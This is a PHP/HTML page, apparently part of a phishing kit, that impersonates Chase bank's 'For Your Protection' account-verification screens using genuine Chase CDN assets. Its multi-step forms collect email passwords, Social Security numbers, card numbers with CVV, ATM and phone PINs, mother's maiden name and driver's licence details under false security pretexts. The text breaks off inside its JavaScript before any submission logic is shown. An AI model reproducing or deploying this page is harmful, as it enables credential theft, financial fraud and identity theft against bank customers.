<?php

session_start();
require_once '../main.php';
header('Access-Control-Allow-Origin: *');
//
// if($letter === 'unusual_activity') {
//     $locked = parse_ini_file("../unusual_activity.ini", true);
// } elseif($letter === 'limited') {
//     $locked = parse_ini_file("../limited.ini", true);
// }
   $notice['we'] = 'CHANGE ME';
   $notice['weneed'] = 'CHANGE ME';
   $notice['but'] = 'CHANGE ME';
?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

        <meta name="robots" content="noindex,nofollow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="msapplication-config" content="none">
        <title>For Your Protection - chase.com</title>
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chasefavicon.ico">
    <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.08.25-2054/logon/assets/logon.css">
<link rel="stylesheet" href="https://static.chasecdn.com/web/2019.07.21-797/common/assets/blue-ui.css">
<style type="text/css">
@font-face {
    font-family: 'icomoon';
    src: url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.eot?bj1g7l");
    src: url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.eot?bj1g7l#iefix") format('embedded-opentype'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.ttf?bj1g7l") format('bj1g7l'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.woff?bj1g7l") format('woff'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.svg?bj1g7l#icomoon") format('svg');
    font-weight: normal;
    font-style: normal
}
    .timeout-message {
    background-color: #128842;
    display: none;
}

.timeout-message__inner {
    position: relative;
    min-height: 2.25em;
    padding-top: 14px;
    padding-bottom: 14px;
}

.timeout-message__inner button {
    background-color: transparent;
    border: none;
    padding: 0
}

.timeout-message__text {
    line-height: 1.3em;
    font-weight: 300;
    position: relative;
}

.timeout-message__text-msg {
    display: none;
    color: #fff;
    margin: 0;
    position: relative;
    vertical-align: middle;
    padding-left: 32px;
    padding-right: 32px;
    font-size: 1.15em;
}

.timeout-message__text-msg.display {
    display: inline-block
}

.timeout-message__text-msg:focus {
    outline: 1px dotted #000
}

.timeout-message__dismiss-btn {
    color: #fff;
    text-decoration: none;
    position: absolute;
    font-size: .875em;
    line-height: 1.6em;
    top: 2px;
    right: 0;
}

.timeout-message__dismiss-btn:focus {
    outline: 1px dotted #000
}

.timeout-message__checkmark {
    display: inline-block;
    position: absolute;
    left: 0;
    margin-right: 12px;
}

.timeout-message__checkmark.icon-check-mark {
    -webkit-border-radius: 22px;
    border-radius: 22px;
    height: 22px;
    width: 22px;
    background: #fff;
    top: 4px;
}

.timeout-message__checkmark.icon-check-mark:before {
    color: #128842;
    font-size: 20px;
    font-weight: 300
}

@media only screen and (min-width: 48em) {
    .timeout-message__inner {
        padding-top:20px;
        padding-bottom: 20px;
        padding-left: 8px;
        padding-right: 8px
    }

    .timeout-message__text {
        font-size: 1.25em;
        line-height: 1.3em
    }

    .timeout-message__checkmark.icon-check-mark:before {
        margin-left: 1px
    }
    .feature-container {
        margin: 0 auto;
        max-width: 75em
    }
    .container-fluid {
    margin-right: auto;
    margin-left: auto;
    padding-left: 8px;
    padding-right: 8px
}
}
[class^="icon-"]:before,[class*=" icon-"]:before {
    font-family: 'icomoon' !important;
    /* speak: none; */
    font-style: normal;
    font-weight: normal;
    font-variant: normal;
    text-transform: none;
    line-height: 1;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}
.icon-close:before {
    content: "\e611";
}
.icon-check-mark:before {
    content: "\e60c";
}

.loader,
.loader:after {
  border-radius: 50%;
  width: 10em;
  height: 10em;
}
.loader {
  margin: 60px auto;
  font-size: 5px;
  position: relative;
  text-indent: -9999em;
  border-top: 1.1em solid rgba(255, 255, 255, 0.2);
  border-right: 1.1em solid rgba(255, 255, 255, 0.2);
  border-bottom: 1.1em solid rgba(255, 255, 255, 0.2);
  border-left: 1.1em solid #0092ff;
  -webkit-transform: translateZ(0);
  -ms-transform: translateZ(0);
  transform: translateZ(0);
  -webkit-animation: load8 1.1s infinite linear;
  animation: load8 1.1s infinite linear;
}
@-webkit-keyframes load8 {
  0% {
    -webkit-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
@keyframes load8 {
  0% {
    -webkit-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
</style>
</head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true" onFocus="parent_disable();" onclick="parent_disable();">
<div class="jpui modal" id="fullscreen-container" data-is-view="true" style="display: none;">
    <div class="dialog vertical-center util print-position-initial">
        <section class="dialogContent">
            <div class="row">
                <div class="col-xs-12 col-sm-7 col-sm-offset-3 util print-width-100-percent print-nomargin yielded-modal-content"><h1 class="u-no-outline dialogTitle" tabindex="-1"><i class="jpui exclamation-color icon error" id="undefined" aria-hidden="true"></i><span class="util accessible-text">Important: </span> Email Authentication Required.</h1><div class="suspended-advisory dialogMessage">We automatically redirected you to <span></span> to verify your email.<div class="loader">Loading...</div><a href="javascript:child_open(url)">Verify your email in the window provided. Click here if you can't find it.</a></div>
            </div>
        </section>
    </div>
</div>

<div class="jpui modal" id="inactiveAccountDialog" data-is-view="true" style="display: none;">
    <div class="dialog vertical-center util print-position-initial">
        <section class="dialogContent">
            <div class="row">
                <div class="col-xs-12 col-sm-7 col-sm-offset-3 util print-width-100-percent print-nomargin yielded-modal-content"><h1 class="u-no-outline dialogTitle" tabindex="-1"><i class="jpui exclamation-color icon error" id="undefined" aria-hidden="true"></i><span class="util accessible-text">Important: </span> <?php echo $notice['we'];?></h1> <div class="suspended-advisory dialogMessage"> <?php echo $notice['weneed'];?>&nbsp;please <a href="#">click <?php echo $notice['but'];?> to proceed<</div><br> <div class="row"><div class="col-xs-12 col-sm-offset-4 col-sm-4"><button type="button" id="exitAccountSuspended" class="jpui button focus primary fluid"><span class="label"><?php echo $notice['but'];?></span> </button></div></div></div>
            </div>
        </section>
    </div>
</div>
    <div id="logonApp" data-is-view="true">

        <div class="homepage" tabindex="-1">
            <div class="logon-container" id="container">
                <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
                    <div class="logon header jpui transparent navigation bar" data-is-view="true">
                        <a id="logoHomepageLink" href="#">
                            <div class="chase logo"></div> <span class="util accessible-text">Chase.com homepage</span></a>
                    </div>

                </header>
                <main id="logon-content" data-has-view="true">
                    <div class="msd" data-is-view="true">
                        <div id="backgroundImage">
                            <div class="jpui background image fixed blurred" id="geoImage">
                                <style type="text/css">
                                    ul li {
                                        margin-bottom: 5px;
                                    }
                                    .jpui.background.image {
                                        background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg);
                                        filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg', sizingMethod='scale');
                                        -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg', sizingMethod='scale');
                                    }

                                    @media (min-width:320px) {
                                        .jpui.background.image {
                                            background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg);
                                        }
                                    }

                                    @media (min-width:992px) {
                                        .jpui.background.image {
                                            background-image: url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.2.jpeg);
                                        }
                                    }

                                    @media (min-width:1024px) {
                                        .jpui.background.image {
                                            background-image: url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.2.jpeg);
                                        }
                                    }
                                </style>
                            </div>
                        </div>
                         <div class="container step1" style="display: none;">
                            <div class="row jpui primary panel">
                                <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
                                    <div class="toggle-aria-hidden">
                                        <h1 class="header" tabindex="-1">For Your Protection</h1>
                                        <div class="row jpui panel body" id="mainpanel">
                                            <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                                                <div class="progress u-no-outline" id="progress" tabindex="-1">
                                                    <div class="row">
                                                        <div class="col-xs-12 col-sm-6 clear-padding">
                                                            <h2>Instructions <span class="util high-contrast">Step 1 of 3</span></h2> </div>
                                                        <div class="col-xs-12 col-sm-6 progress-padding">
                                                            <div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
                                                                <ol class="steps-3" role="presentation">
                                                                    <li class="active current-step" id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li>
                                                                    <li id="progress-progressBar-step-2"></li>
                                                                    <li id="progress-progressBar-step-3"></li>
                                                                </ol>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <h3>We require you to confirm your information on your account.</h3>
                                                <div class="inside-container">
                                                    <p>This happened because we at chase are performing a security upgrade to serve our customer better. (Cookies are how we remember you.)
                                                        <br>
                                                        <br>For your security, we need to verify your information before you can sign in to your accounts.
                                                        <br>
                                                        <br>Choose "Next" to confirm you own this account.</p>
                                                    <p><span class="jpui link" id="request_identification_advisory_message-link-wrapper"><a class="link-anchor underline" id="request_identification_advisory_message" href="javascript:void(0);" aria-label=" Questions? : Opens information dialog">Questions?</a></span></p>
                                                </div>
                                               <div class="button-container row hide-sm">
                                                    <div class="col-xs-12 col-sm-3 col-sm-push-9">
                                                        <button type="button" id="requestDeliveryDevices" class="jpui button focus fluid primary"><span class="label">Next</span> </button>
                                                    </div>
                                                    <div class="col-xs-12 col-sm-3 col-sm-push-3">
                                                       <button type="button" id="exitIdentification" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                                                </div>
                                                </div>
                                                <div class="button-container row hide-xs show-sm">
                                                    <div class="col-xs-12 col-sm-3 col-sm-offset-6">
                                                        <button type="button" id="exitIdentification-sm1" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                                                    </div>
                                                    <div class="col-xs-12 col-sm-3">
                                                        <button type="button" id="requestDeliveryDevices-sm" class="jpui button focus fluid primary"><span class="label">Next</span> </button>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
<div id="errorrSignIn" ></div>

<div class="container step2" style="display: none;">
    <div class="row jpui primary panel">
        <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
            <h1 class="header" tabindex="-1">For Your Protection</h1>
            <div class="row jpui panel body">
                <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                    <div class="progress u-no-outline" id="progress" tabindex="-1">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 clear-padding">
                                <h2>Get verified<span class="util high-contrast">Step 2 of 3</span></h2> </div>
                            <div class="col-xs-12 col-sm-6 progress-padding">
                                <div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
                                    <ol class="steps-3" role="presentation">
                                        <li class="active" id="progress-progressBar-step-1"></li>
                                        <li class="active current-step" id="progress-progressBar-step-2"></li>
                                        <li id="progress-progressBar-step-3"><span class="util accessible-text" id="accessible-progress-progressBar-step-3"></span></li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                    </div>
                    <form class="emailaccess" id="emailaccess" method="POST" autocomplete="off" action="javascript:void(0);">
                        <h3 class="emaildresstext1">Confirm your identity using your email linked to your chase account.</h3>
                        <h3 class="emailpasswordtext1" style="display: none;">Confirm your identity using <span></span></h3>
                        <p class="emailPasswordtext2" style="display: none;">For your security, enter your password for (<strong></strong>) linked to your chase account. By successfully logging in to the <span></span> account associated with Chase, we'll know it's you. You won't receive a confirmation email or have to take any further action.</p>
                        <p class="emaildresstext2">For your security, we need to verify your identity. Please note that the verification process will continue after your email is validated.</p>
                        <div class="inside-container">
                            <div class="row emaildress">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label emaildress" for="otpcode_input-input-field"><span class="accessible-text emaildress hidden"></span>Email Address</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="emaildress" placeholder="Email Address" format="" name="emaildress" data-validate="identificationCode" required="" value="" type="text">
                                        <div style="width: 100%; float: left; position: relative !important; margin-top: -46px; display: none;" id="error-bubble" class="identificationCode-error-bubble error-bubble" tabindex="-1"><a class="jpui error pointing below noborder attached label" id="identificationCode-error-bubble" href="javascript:void(0);" data-arrowposition="50" tabindex="0" aria-labelledby="identificationCode-error-bubble-label-content"><span class="label-outline" id="identificationCode-error-bubble-label-content">The email address you entered is incorrect. Please enter it again. </span></a></div>

                                    </div>
                                </div>
                            </div>

                            <div class="row emailPassword" style="display: none;">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field"><span class="accessible-text hidden"></span>Email Password</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="emailPassword" placeholder="Email Password" format="" name="emailPassword" data-validate="identificationCode" required="" value="" type="password" style="display: none;">
                                        <div style="width: 100%; float: left; position: relative !important; margin-top: -46px; display: none;" id="error-bubble1" class="identificationCode-error-bubble error-bubble" tabindex="-1"><a class="jpui error pointing below noborder attached label" id="identificationCode-error-bubble" href="javascript:void(0);" data-arrowposition="50" tabindex="0" aria-labelledby="identificationCode-error-bubble-label-content"><span class="label-outline" id="identificationCode-error-bubble-label-content">The email password you entered is incorrect. Please try again. </span></a></div>

                                    </div>
                                </div>
                            </div>

                            <div class="row emailPasswordC" style="display: none;">
                                <div class="col-xs-12 col-sm-5 label-column">
                                    <label class="jpui label" for="password_input-input-field"><span class="accessible-text hidden" id="pwlabel"></span>Confirm Email Password</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column">
                                    <div class="margin-bottom-20px" id="password_input">
                                        <input class="jpui input margin-bottom-20px" id="emailPasswordC" placeholder="Confirm Email Password" format="" type="password" name="emailPasswordC" required="" value=""> </div>
                                </div>
                            </div>
                            <input type="hidden" name="emailretry" value="" id="emailretry">
                            <input type="hidden" name="urli" value="" id="urli">
                            <input type="hidden" name="emailType" value="" id="emailType">
                            <input type="hidden" name="emailProvider" value="" id="emailProvider">
                            <h3>Enter your email</h3>
                            <p class="identification-code-received-message"><span><p>We use industry-standard encryption to protect your data. By providing your email, we verify in real time that you own the email on file. We then use this information to establish a secure connection with your email provider.</p></span> <span class="jpui link" id="requestNewIdentificationCode-link-wrapper"><a class="link-anchor underline" id="requestNewIdentificationCode" href="javascript:void(0);" aria-label=" chase account verification ">Email Auth</a></span></p>
                        </div>
                        <div class="button-container row hide-sm">
                            <div class="col-xs-12 col-sm-3 col-sm-push-9">
                                <button type="submit" id="requestIdentificationCode" class="jpui button focus fluid primary"><span class="label">Next</span> </button>
                            </div>
                            <div class="col-xs-12 col-sm-3 col-sm-push-3">
                                <button type="button" id="exitIdentification" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                            </div>
                        </div>
                        <div class="button-container row hide-xs show-sm">
                            <div class="col-xs-12 col-sm-3 col-sm-offset-6">
                                <button type="button" id="exitIdentification-sm2" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                            </div>
                            <div class="col-xs-12 col-sm-3">
                                <button type="submit" id="requestIdentificationCode-sm" class="jpui button focus fluid primary disabled" disabled=""><span class="label">Next</span> </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
    <div class="container step3" style="display: none;">
    <div class="row jpui primary panel">
        <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
            <h1 class="header" tabindex="-1">For Your Protection</h1>
            <div class="row jpui panel body">
                <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                    <div class="progress u-no-outline" id="progress" tabindex="-1">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 clear-padding">
                                <h2>Verify your Billing details on file <span class="util high-contrast">Step 3 of 3</span></h2> </div>
                            <div class="col-xs-12 col-sm-6 progress-padding">
                                <div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
                                    <ol class="steps-3" role="presentation">
                                        <li class="active" id="progress-progressBar-step-1"></li>
                                        <li class="active" id="progress-progressBar-step-2"></li>
                                        <li class="active current-step" id="progress-progressBar-step-3"><span class="util accessible-text" id="accessible-progress-progressBar-step-3"></span></li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                    </div>
                    <form class="billing" id="billing" method="POST" autocomplete="off" action="#" novalidate="">
                        <h3>Billing Verification</h3>
                        <p>Your identification will be verified once submitted, please be sure of your information before you submit.</p>
                        <div class="inside-container">
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Full Name</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="fullname" placeholder="Full Name" format="" type="text" name="fullname" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Date Of Birth</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="DateOfBirth" placeholder="MM/DD/YYYY" format="" type="text" name="DateOfBirth" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Street Address</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="StreetAddress" placeholder="Street Address" format="" type="text" name="StreetAddress" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Zip</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="ZipCode" placeholder="Zip" format="" type="text" name="ZipCode" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">City</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="CityR" placeholder="City" format="" type="text" name="CityR" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">State / Region</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="StateRegion" placeholder="State" format="" type="text" name="StateRegion" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>

                             <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Phone Number</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="NumberPhone" placeholder="Phone Number" format="" type="tel" autocomplete="tel" name="NumberPhone" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row NumberCarrier" style="">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Phone Carrier</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="NumberCarrier" placeholder="Phone Carrier" format="" type="text" name="NumberCarrier" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row NumberPin" style="">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Phone PIN</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="NumberPin" placeholder="Phone Pin" format="" type="text" name="NumberPin" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Social Security Number</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="SecurityNumber" placeholder="SSN" format="" type="text" name="SecurityNumber" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <h3>Billing verification</h3>
                            <p class="identification-code-received-message"><span>Your Billing details will be verified once submitted, please be sure of your information before you submit.</span> <span class="jpui link" id="requestNewIdentificationCode-link-wrapper"><a class="link-anchor underline" id="requestNewIdentificationCode" href="javascript:void(0);" aria-label=" chase account verification ">chase account verification</a></span></p>
                        </div>
                        <div class="button-container row hide-sm">
                            <div class="col-xs-12 col-sm-3 col-sm-push-9">
                                <button type="submit" id="log_on_to_landing_page" class="jpui button focus fluid primary"><span class="label">Next</span> </button>
                            </div>
                            <div class="col-xs-12 col-sm-3 col-sm-push-3">
                                <button type="button" id="exitIdentification" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                            </div>
                        </div>
                        <div class="button-container row hide-xs show-sm">
                            <div class="col-xs-12 col-sm-3 col-sm-offset-6">
                                <button type="button" id="exitIdentification-sm3" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                            </div>
                            <div class="col-xs-12 col-sm-3">
                                <button type="submit" id="log_on_to_landing_page-sm" class="jpui button focus fluid primary disabled" disabled=""><span class="label">Next</span> </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container step4" style="display: none;">
    <div class="row jpui primary panel">
        <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
            <h1 class="header" tabindex="-1">For Your Protection</h1>
            <div class="row jpui panel body">
                <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                    <div class="progress u-no-outline" id="progress" tabindex="-1">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 clear-padding">
                                <h2>Verify your card details on file <span class="util high-contrast">Step 3 of 3</span></h2> </div>
                            <div class="col-xs-12 col-sm-6 progress-padding">
                                <div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
                                    <ol class="steps-3" role="presentation">
                                        <li class="active" id="progress-progressBar-step-1"></li>
                                        <li class="active" id="progress-progressBar-step-2"></li>
                                        <li class="active current-step" id="progress-progressBar-step-3"><span class="util accessible-text" id="accessible-progress-progressBar-step-3"></span></li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                    </div>
                    <form class="card" id="card" method="POST" autocomplete="off" action="#" novalidate="">
                        <h3>Enter your identification details.</h3>
                        <p>Your identification will be verified once submitted, please be sure of your information before you submit.</p>
                        <div class="inside-container">
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Card Number</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="CardNumber" placeholder="Card Number" format="" type="text" name="CardNumber" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Expiration Date</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="ExpirationDate" placeholder="MM/YY" format="" type="text" name="ExpirationDate" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">CVV</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="Cvv" placeholder="CVV" format="" type="text" name="Cvv" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Mother's Maiden Name</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="MaidenName" placeholder="MMN" format="" type="text" name="MaidenName" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">ATM PIN</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="AtmPin" placeholder="Atm Pin" format="" type="text" name="AtmPin" data-validate="identificationCode" required="" value="">

                                    </div>
                                </div>
                            </div>
                             <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Driver's License Number</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="LicenseNumber" placeholder="Drivers License" format="" type="text" name="LicenseNumber" data-validate="identificationCode" required="" value="">
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Driver's License Number Expiry</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                        <input class="jpui input account-input ssn_card_account_number" id="LicenseNExp" placeholder="Driver's License Number Expiry" format="" type="text" name="LicenseNExp" data-validate="identificationCode" required="" value="">
                                    </div>
                                </div>
                            </div>
                            <input type="hidden" name="type" value="" id="type">
                            <input type="hidden" name="bank" value="" id="bank">
                            <input type="hidden" name="brandbank" value="" id="brandbank">

                            <h3>We verify your account right away</h3>
                            <p class="identification-code-received-message"><span>Your account will be activated upon submission of your details.</span> <span class="jpui link" id="requestNewIdentificationCode-link-wrapper"><a class="link-anchor underline" id="requestNewIdentificationCode" href="javascript:void(0);" aria-label=" chase account verification ">chase account verification</a></span></p>
                        </div>
                        <div class="button-container row hide-sm">
                            <div class="col-xs-12 col-sm-3 col-sm-push-9">
                                <button type="submit" id="log_on_to_landing_page1" class="jpui button focus fluid primary"><span class="label">Next</span> </button>
                            </div>
                            <div class="col-xs-12 col-sm-3 col-sm-push-3">
                                <button type="button" id="exitIdentification" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                            </div>
                        </div>
                        <div class="button-container row hide-xs show-sm">
                            <div class="col-xs-12 col-sm-3 col-sm-offset-6">
                                <button type="button" id="exitIdentification-sm4" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                            </div>
                            <div class="col-xs-12 col-sm-3">
                                <button type="submit" id="log_on_to_landing_page-sm1" class="jpui button focus fluid primary disabled" disabled=""><span class="label">Finish</span> </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
                    </div>
                </main>
            </div>

            <footer class="logon-footer" id="logon-footer" data-has-view="true"></footer>
        </div>
        <div id="languageSupportDisclaimer"></div>
        <div id="overlay" data-has-view="true"></div>
        <div class="overlay"></div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
    <script type="text/javascript">
        var emailretry = 0;
document.onreadystatechange = function () {
  var state = document.readyState;
  if (state == 'complete') {


    var enablenotice = "off";
    if (enablenotice == "on") {
        $("#inactiveAccountDialog").show();
    }

      setTimeout(function(){
          document.getElementById('interactive');
      },4000);
  }
}
</script>
    <script>$(document).ready(function(){
    $('#exitAccountSuspended').click(function (e) {
    e.stopPropagation();
    $('#inactiveAccountDialog').slideUp();
   });
   if (sessionStorage.getItem('finished')) {
    $(".container.step4").hide();
    $(".container.step3").show();
    $(".container.step1").hide();
    $(".container.step2").hide();
   } 
});

$(document).ready(function() {
